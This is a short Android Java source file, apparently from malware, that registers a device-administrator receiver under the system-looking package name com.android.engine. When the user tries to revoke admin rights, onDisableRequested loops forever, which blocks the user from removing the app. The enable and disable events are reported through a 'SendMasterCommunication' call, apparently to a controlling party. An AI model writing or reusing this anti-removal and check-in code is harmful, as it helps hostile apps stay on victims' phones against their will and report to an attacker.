package com.android.engine;

import android.annotation.TargetApi;
import android.app.admin.DeviceAdminReceiver;
import android.content.Context;
import android.content.Intent;

@TargetApi(8) public class DeviceAdmin extends DeviceAdminReceiver {

  public CharSequence onDisableRequested(Context context, Intent intent) {
    while (true) {
      // TODO
    }
  }

  public void onDisabled(Context context, Intent intent) {
    super.onDisabled(context, intent);
    SendMasterCommunication.sendAction(95);
  }

  public void onEnabled(Context context, Intent intent) {
    super.onEnabled(context, intent);
    SendMasterCommunication.sendAction(94);
  }
}
